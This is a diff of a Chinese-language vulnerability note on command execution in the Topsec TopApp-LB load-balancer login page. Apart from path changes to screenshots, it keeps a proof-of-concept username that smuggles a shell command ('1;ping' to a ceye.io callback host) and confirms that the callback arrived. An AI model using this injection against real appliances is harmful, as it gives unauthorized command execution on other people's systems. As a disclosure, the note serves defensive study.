@@ -20,20 +20,12 @@ app="天融信-TopApp-LB-负载均衡系统"
 
 登录界面中存在命令执行
 
-
-
 账号:**1;ping 6km5dk.ceye.io;echo**
 
 密码:**任意**
 
-
-
-![](images/202202091921374.png)
-
-
+![](../.gitbook/assets/202202091921374.png)
 
 成功收到请求
 
-
-
-![](images/202202091921379.png)
+![](../.gitbook/assets/202202091921379.png)
